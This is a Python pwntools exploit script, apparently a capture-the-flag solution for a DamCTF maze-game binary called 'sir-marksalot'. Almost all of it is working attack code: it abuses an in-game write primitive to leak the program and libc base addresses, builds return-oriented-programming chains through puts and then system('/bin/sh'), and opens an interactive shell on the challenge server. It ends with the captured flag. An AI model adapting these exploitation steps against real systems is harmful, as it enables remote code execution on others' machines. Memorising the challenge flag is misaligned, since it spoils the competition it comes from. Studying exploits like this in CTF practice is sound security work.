#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sir-marksalot
import subprocess

from pwn import log, args, remote, process, gdb, context, ELF, cyclic_gen, p64, u64, pause
from pwn import *

HOST, PORT = "chals.damctf.xyz 31314".split()

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sir-marksalot')
libc_path = "./libc6_2.27-3ubuntu1.4_amd64.so" if args.REMOTE else "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc_path)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

directions = {
    "w": "North",
    "s": "South",
    "a": "West",
    "d": "East"
}

class Player(object):

    def __init__(self: object, x: int, y: int) -> None:
        self.x_coord = x
        self.y_coord = y

    def __str__(self: object) -> str:
        return f"x: {self.x_coord}, y: {self.y_coord}"


def read_map() -> Player:
    io.recvuntil(b"): ")
    io.sendline(b"m")
    map = []
    tmp_player = None
    for i in range(81):
        line = io.recvline()
        if b"*" in line:
            y = i // 2
            x = line.find(b"*") // 4
            tmp_player = Player(x, y)
        map.append(line)

    return tmp_player


def get_grue_position(x: int, y: int) -> Player:
    arg = ""
    if args.REMOTE:
        arg = "REMOTE"
    if args.GDB:
        arg = "GDB"
    output = subprocess.check_output([
        "./generate_random",
        str(x),
        str(y),
        arg
    ]).decode().strip().split("\n")

    options = list()
    for option in output:
        y, x = option.split(",")
        x = int(x)
        y = int(y)
        options.append(Player(x, y))

    assert len(options) > 0
    return options[-1]


def go(direction: str) -> bool:
    # log.info(f"Going {directions[direction]}")
    io.recvuntil(b"): ")
    io.sendline(direction.encode())
    res = io.recvline()
    if b"There's a wall there." in res:
        return False
    if b"You were eaten by a Grue." in res:
        log.info("Eaten by a Grue!")
    return True


def north() -> bool:
    res = go("w")
    if res:
        player.y_coord -= 1
    # log.info(f"Player position: {str(player)}")
    return res


def south() -> bool:
    res = go("s")
    if res:
        player.y_coord += 1
    # log.info(f"Player position: {str(player)}")
    return res


def west() -> bool:
    res = go("a")
    if res:
        player.x_coord -= 1
    # log.info(f"Player position: {str(player)}")
    return res


def east() -> bool:
    res = go("d")
    if res:
        player.x_coord += 1
    # log.info(f"Player position: {str(player)}")
    return res


def evil_north() -> bool:
    write(b"\x0f"*0x20)
    return north()


def evil_south() -> bool:
    write(b"\x0f"*0x20)
    return south()


def evil_west() -> bool:
    write(b"\x0f"*0x20)
    return west()


def evil_east() -> bool:
    write(b"\x0f"*0x20)
    return east()


def write(what: str) -> None:
    io.recvuntil(b"): ")
    io.sendline(b"x")
    io.recvuntil(b"write?")
    io.send(what.ljust(0x20, b"\x00"))


def set_position(x: int, y: int) -> None:
    global player
    x_foo = evil_east if x > player.x_coord else evil_west
    y_foo = evil_south if y > player.y_coord else evil_north

    while player.x_coord != x:
        x_foo()

    while player.y_coord != y:
        y_foo()

    log.success(f"Position set to: {x}, {y}")

def leak(read: bool = True) -> int:
    if read:
        io.recvuntil(b"written: ")
    _leak = io.recvline().strip().ljust(8, b"\x00")
    _leak = u64(_leak)
    return _leak

io = start()

io.recvuntil(b"What would you like to do?")
io.sendline(b"jump up and down")

#
# STAGE 0x1
#

player = read_map()
log.success("Got player")
print(player)

log.info("Searching for probable random seed")
possible_position = get_grue_position(player.x_coord, player.y_coord)
log.success("Got grue position")
print(possible_position)

set_position(1, 39)
evil_south()
exe.address = leak() - 0x1217
log.success(f"Got leak: {hex(exe.address)}")

pop_two_registers = exe.address + 0x0b92
pop_rdi = exe.address + 0x0b95

fill = b"\x0f"*8

evil_east()
write(cyclic_gen().get(8) + p64(pop_two_registers) + fill*2)
east()
write(p64(pop_rdi) + p64(exe.got.puts) + p64(pop_two_registers) + fill)
east()
write(p64(0xdeadbeef) + p64(exe.sym.puts) + p64(exe.sym.main) + fill)
res = north()
assert res == True

set_position(possible_position.x_coord, possible_position.y_coord)

libc_leak = leak(read=False)

libc.address = libc_leak - libc.sym.puts
log.success(f"Got libc address: {hex(libc.address)}")

#
# STAGE 0x2
#

io.recvuntil(b"What would you like to do?")
io.sendline(b"jump up and down")

player = read_map()
log.success("Got player")
print(player)

log.info("Searching for probable random seed")
possible_position = get_grue_position(player.x_coord, player.y_coord)
log.success("Got grue position")
print(possible_position)

binsh = next(libc.search(b"/bin/sh"))

set_position(2, 39)
evil_south()
write(cyclic_gen().get(8) + p64(pop_two_registers) + fill*2)
east()
write(p64(pop_rdi) + p64(binsh) + p64(libc.sym.system) + fill)
res = north()
assert res == True

set_position(possible_position.x_coord, possible_position.y_coord)

io.interactive()

# dam{1n73N710N4LLy_93771n9_3473n_8y_4_9rU3-7H47_w42_9Ru3S0M3}
